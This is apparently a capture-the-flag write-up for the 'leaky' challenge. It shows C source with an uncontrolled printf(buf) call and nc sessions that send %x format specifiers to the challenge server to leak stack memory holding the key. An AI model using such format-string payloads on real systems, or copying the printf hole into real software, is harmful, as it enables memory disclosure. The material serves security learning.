HackCenter: https://hackcenter.com/

# Description
Leak the key from memory. Source is available at leaky.c, and the binary's running on enigma2017.hackcenter.com:14410.
	
* HINTS
	* man 3 printf
	* What does printf do if it receives a format specifier like %x, but has no more args?
	* Where is the key allocated in memory? (heap, stack, text, etc)
	* The solution is *8* hex characters

# Solution
Read some leaky.c codes first.
```c
char buf[80];
  
int main (int argc, char **argv)
{
  
    unsigned int filler0 = 0x70115011;
    unsigned int filler1 = 0x70077011;
    unsigned int key     = ???;
    unsigned int filler2 = 0x50115075;
    unsigned int filler3 = 0x70117117;
    unsigned int filler4 = 0x70075110;
    unsigned int filler5 = 0x71171075;
  
    unsigned int red = read(STDIN_FILENO,buf,80);
    buf[red] = '\x00';
    printf(buf);
}
```
'key' must be the flag we want to get.
Let's nc to the serve, and see what we will get.
```shell
Ice1187# nc enigma2017.hackcenter.com 14410
1234
1234
```
It will reflect whatever we type, interesting.
Accroding to the hint, I try the %x.
```shell
Ice1187# nc enigma2017.hackcenter.com 14410
%x
80497c0
```
It seems that it's leaking some infos, trying to leak more !
```shell
Ice1187# nc enigma2017.hackcenter.com 14410
%x.%x.%x.%x.%x
80497c0.50.80482bd.f.71171075
```
The fifth %x is the filler5 in the leaky.c, so the ninth %x is the key.
Get flag.


